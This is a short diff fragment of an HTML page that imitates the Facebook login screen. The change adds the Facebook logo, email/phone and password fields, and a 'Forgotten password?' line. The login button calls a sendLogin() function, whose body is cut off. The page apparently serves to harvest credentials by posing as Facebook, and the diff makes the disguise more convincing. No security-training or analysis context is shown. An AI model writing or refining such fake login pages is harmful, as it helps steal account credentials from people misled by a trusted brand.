@@ -14,12 +14,14 @@
 </head>
 <body>
 
-    <div class="login-box">
-        <h2>Login to Facebook<br>to continue </h2>
-        <input type="email" id="email" placeholder="Email or Phone"><br>
-        <input type="password" id="password" placeholder="Password"><br>
-        <button onclick="sendLogin()">Log In</button>
+       <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
+        <input type="email" id="email" placeholder="Mobile number or email address">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="sendLogin()">Log in</button>
+        <p class="forgot-password">Forgotten password?</p>
     </div>
+
 
     <script>
         function sendLogin() {
